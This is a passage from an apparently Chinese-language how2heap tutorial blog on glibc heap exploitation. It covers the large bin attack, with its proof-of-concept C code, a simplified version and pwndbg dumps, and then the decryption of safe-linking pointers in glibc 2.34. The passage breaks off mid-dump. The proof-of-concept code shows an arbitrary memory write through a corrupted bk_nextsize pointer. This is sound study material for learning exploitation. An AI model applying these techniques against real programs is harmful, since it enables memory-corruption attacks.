class="built_in">printf</span>(<span class="string">"This prevents the traditional large bin attack\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n"</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"====================================================================\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here is the target we want to overwrite (%p) : %lu\n\n"</span>,&amp;target,target);</span><br><span class="line">  <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"First, we allocate a large chunk [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"And another chunk to prevent consolidate\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"We also allocate a second large chunk [p2]  (%p).\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This chunk should be smaller than [p1] and belong to the same large bin.\n"</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Once again, allocate a guard chunk to prevent consolidate\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Free the larger of the two --&gt; [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Allocate a chunk larger than [p1] to insert [p1] into large bin\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Free the smaller of the two --&gt; [p2] (%p)\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"At this point, we have one chunk in large bin [p1] (%p),\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"               and one chunk in unsorted bin [p2] (%p)\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n"</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n"</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"  the modified p1-&gt;bk_nextsize does not trigger any error\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n"</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n"</span>, p2<span class="number">-2</span>, (<span class="keyword">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Target (%p) : %p\n"</span>,&amp;target,(<span class="keyword">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"====================================================================\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="keyword">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>简化版本：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> *p = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x8</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x430</span>); <span class="comment">//bigger than p</span></span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line">  p[<span class="number">3</span>] = (<span class="keyword">size_t</span>)(&amp;target<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x430</span>);  <span class="comment">//bigger than victim and p</span></span><br><span class="line">  assert(target == (<span class="keyword">size_t</span>)(victim<span class="number">-2</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="pwndbg调试-6"><a href="#pwndbg调试-6" class="headerlink" title="pwndbg调试"></a>pwndbg调试</h3><p>在p和victim直接申请的小chunk是为了防止与top chunk合并。<br>free(p)之后，p被放入 unsorted bin。之后再申请一个大于 p 大小的 chunk，在遍历 unsorted bin的时候就会将 p 放入 large bin。<br>free(victim)之后，victim被放入 unsorted bin。<br>下一行<code>p[3] = (size_t)(&amp;target-4);</code>的意思是，p的bk_nextsize指针指向<code>(&amp;target-4)</code>。也就是伪造一个fake_chunk，fake_chunk的fd_nextsize指针存放的是目标地址target。如下图。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/largebin_fakechunk.png" alt><br>p-&gt;bk_nextsize指向了fake_chunk-&gt;fd_nextsize，也就是target。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/largebin_heap1.png" alt><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p p</span><br><span class="line"><span class="meta">$</span>2 = (size_t *) 0x5555557572a0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x555555757290</span><br><span class="line">0x555555757290: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x5555557572a0: 0x00007ffff7dbf0b0      0x00007ffff7dbf0b0</span><br><span class="line">0x5555557572b0: 0x0000555555757290      0x0000555555757290</span><br><span class="line">0x5555557572c0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>修改之后：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/largebin_heap2.png" alt><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x555555757290</span><br><span class="line">0x555555757290: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x5555557572a0: 0x00007ffff7dbf0b0      0x00007ffff7dbf0b0</span><br><span class="line">0x5555557572b0: 0x0000555555757290      0x00007fffffffd968(这里改掉了，改成了fake_chunk)</span><br><span class="line">0x5555557572c0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>那么，接下来再 malloc 一个比 p 和 victim 都大的 chunk 的时候，会将victim链入large bin。存放victim的时候，victim直接插入链表尾，所以原本是将victim-&gt;fd_nextsize指向链表头的最大chunk（这里也就是p）。观察一下代码：<br>从这里正式进入了victim放进large bin操作。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/largebin_inbin.png" alt><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果是large bin中的chunk</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//获取bin的索引</span></span><br><span class="line">	victim_index = largebin_index (size);</span><br><span class="line">	<span class="comment">//链表头作为bck</span></span><br><span class="line">	bck = bin_at (av, victim_index);</span><br><span class="line">	<span class="comment">//链表头的下一个chunk，即链表的第一个chunk作为fwd</span></span><br><span class="line">	fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">	<span class="comment">//如果fwd != bck，说明链表非空，要按顺序存放</span></span><br><span class="line">	<span class="keyword">if</span> (fwd != bck)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">		size |= PREV_INUSE;</span><br><span class="line">		<span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">		assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">		<span class="comment">//如果victim的大小小于链表的最后一个chunk，直接插入链表尾</span></span><br><span class="line">		<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">		&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//链表头作为它的fwd</span></span><br><span class="line">			fwd = bck;</span><br><span class="line">			<span class="comment">//前一个chunk作为它的bck</span></span><br><span class="line">			bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">			<span class="comment">//设置victim的fd_nextsize指向链表头的下一个chunk，即bin中第一个，最大的chunk</span></span><br><span class="line">			victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">			<span class="comment">//在插入它之前，链表第一个chunk的bk_nextsize指向原来最小的chunk</span></span><br><span class="line">			<span class="comment">//设置victim的bk_nextsize指向比它大的最小chunk的第一个</span></span><br><span class="line">			<span class="comment">//也就是fwd-&gt;fd-&gt;bk_nextsize</span></span><br><span class="line">			victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">			<span class="comment">//设置链表第一个chunk的bk_nextsize</span></span><br><span class="line">			<span class="comment">//和victim-&gt;bk_nextsize-&gt;fd_nextsize</span></span><br><span class="line">			<span class="comment">//也就是比它大的最小chunk的第一个的fd_nextsize</span></span><br><span class="line">			<span class="comment">//都指向victim</span></span><br><span class="line">			fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//如果不是最小的话，寻找合适的位置插入</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			assert (chunk_main_arena (fwd));</span><br><span class="line">			<span class="comment">//遍历链表，寻找比victim大的最小chunk</span></span><br><span class="line">			<span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//通过fd_nextsize进行遍历</span></span><br><span class="line">				<span class="comment">//加快速度</span></span><br><span class="line">				fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">				assert (chunk_main_arena (fwd));</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">//如果有相等的</span></span><br><span class="line">			<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">			== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">			<span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">				<span class="comment">//为了不改变nextsize链表</span></span><br><span class="line">				<span class="comment">//插入在它后面作为这个相同size的第二个</span></span><br><span class="line">				fwd = fwd-&gt;fd;</span><br><span class="line">			<span class="comment">//如果没有相等的</span></span><br><span class="line">			<span class="comment">//也就是这个size的chunk只有victim一个</span></span><br><span class="line">			<span class="comment">//就要修改nextsize链表了</span></span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//设置victim的fd_nextsize指向上一个比他大的最小chunk的第一个</span></span><br><span class="line">				victim-&gt;fd_nextsize = fwd;</span><br><span class="line">				<span class="comment">//设置victim的bk_nextsize指向原本fwd的下一个大小的chunk</span></span><br><span class="line">				victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">				<span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">					malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (nextsize)"</span>);</span><br><span class="line">				<span class="comment">//上一个比他大的最小chunk的第一个的bk_nextsize指向victim</span></span><br><span class="line">				fwd-&gt;bk_nextsize = victim;</span><br><span class="line">				<span class="comment">//原本fwd的下一个大小的chunk的fd_nextsize指向victim</span></span><br><span class="line">				victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">			&#125;</span><br><span class="line">			bck = fwd-&gt;bk;</span><br><span class="line">			<span class="comment">//检查bck-&gt;fd是否等于fwd</span></span><br><span class="line">			<span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">				malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (bk)"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//链表为空的情况</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line"><span class="comment">//设置fd和bk指针</span></span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></p>
<p>摘出需要的部分：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">	fwd = bck;</span><br><span class="line">	bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">	victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">	victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">	fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>查看一下各变量里面都是什么。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p fwd-&gt;fd</span><br><span class="line"><span class="meta">$</span>3 = (struct malloc_chunk *) 0x555555757290（也就是p）</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p fwd-&gt;fd-&gt;bk_nextsize</span><br><span class="line"><span class="meta">$</span>4 = (struct malloc_chunk *) 0x7fffffffd968（也就是fake_chunk）</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p victim</span><br><span class="line"><span class="meta">$</span>5 = (mchunkptr) 0x5555557576e0</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
<p>推导一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = p-&gt;bk_nextsize</span><br><span class="line">p-&gt;bk_nextsize = fake_chunk</span><br><span class="line">fake_chunk-&gt;fd_nextsize = target</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = fake_chunk-&gt;fd_nextsize = target</span><br><span class="line"></span><br><span class="line">如果执行fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">==&gt; </span><br><span class="line">target = victim</span><br></pre></td></tr></table></figure></p>
<p>而这里的victim是包含了0x10的头部数据的。<br>这样就获取了一个可以编辑的地址。</p>
<h2 id="decrypt-safe-linking-glibc2-34"><a href="#decrypt-safe-linking-glibc2-34" class="headerlink" title="decrypt_safe_linking_glibc2.34"></a>decrypt_safe_linking_glibc2.34</h2><h3 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h3><p>在 glibc 2.31 之后引入了对于 tcache bin 和 fast bin 的 fd 指针的保护。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">   of Fast-Bins and TCache.  That is, mask the "next" pointers of the</span></span><br><span class="line"><span class="comment">   lists' chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span></span><br><span class="line"><span class="comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">   larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">   still works.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure></p>
<p>在放入 tcache bin 链表的时候，会先对 fd 指针原本的值进行一次加密，存储的是 fd 指针的原地址右移12位后的值与当前tcache 或者 fastbin 头指针值异或的结果。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//tcache bin</span></span><br><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line"><span class="comment">//fast bin</span></span><br><span class="line">fb = &amp;fastbin (av, idx);</span><br><span class="line"><span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">mchunkptr old = *fb, old2;</span><br><span class="line">p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br></pre></td></tr></table></figure></p>
<p>测试程序：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x555555757320 (size : 0x20ce0) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x30)   tcache_entry[1](3): 0x555555757300 --&gt; 0x5555557572d0 --&gt; 0x5555557572a0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/4gx a1</span><br><span class="line">0x5555557572a0: 0x0000000555555757      0xecbfbab9a063fea3</span><br><span class="line">0x5555557572b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/4gx a2</span><br><span class="line">0x5555557572d0: 0x00005550002025f7      0xecbfbab9a063fea3</span><br><span class="line">0x5555557572e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/4gx a3</span><br><span class="line">0x555555757300: 0x0000555000202587      0xecbfbab9a063fea3</span><br><span class="line">0x555555757310: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>a1-&gt;fd 的计算：<br>存入a1的时候，tcache bin 链表为空，所以链表头指针为 null；&amp;a1-&gt;next 为 a1 原本的地址（malloc返回的不包含头部数据）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;a1-&gt;next&gt;&gt;12)^tcache-&gt;entries[tc_idx]=0x000555555757^0=0x555555757</span><br></pre></td></tr></table></figure></p>
<p>a2-&gt;fd 的计算：<br>存入 a2 的时候，tcache bin 链表的头指针为 a1；&amp;a2-&gt;next 为 a2 原本的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;a2-&gt;next&gt;&gt;12)^tcache-&gt;entries[tc_idx]=0x000555555757^0x5555557572a0=0x5550002025F7</span><br></pre></td></tr></table></figure></p>
<p>a3-&gt;fd 的计算：<br>存入 a3 的时候，tcache bin 链表的头指针为 a2；&amp;a3-&gt;next 为 a3 原本的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;a3-&gt;next&gt;&gt;12)^tcache-&gt;entries[tc_idx]=0x000555555757^0x5555557572d0=0x555000202587</span><br></pre></td></tr></table></figure></p>
<p>解密的时候，用该值的地址右移12位后的值异或该值得到解密后的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a1-&gt;fd：</span><br><span class="line">(0x5555557572a0&gt;&gt;12)^0x555555757=0</span><br><span class="line">a2-&gt;fd：</span><br><span class="line">(0x5555557572d0&gt;&gt;12)^0x5550002025F7=0x5555557572a0</span><br><span class="line">a3-&gt;fd：</span><br><span class="line">(0x555555757300&gt;&gt;12)^0x555000202587=0x5555557572D0</span><br></pre></td></tr></table></figure></p>
<p>对于 fastbin 也一样。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x5555557573b0 --&gt; 0x555555757390 --&gt; 0x555555757370 --&gt; 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x5555557573d0 (size : 0x20c30) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) 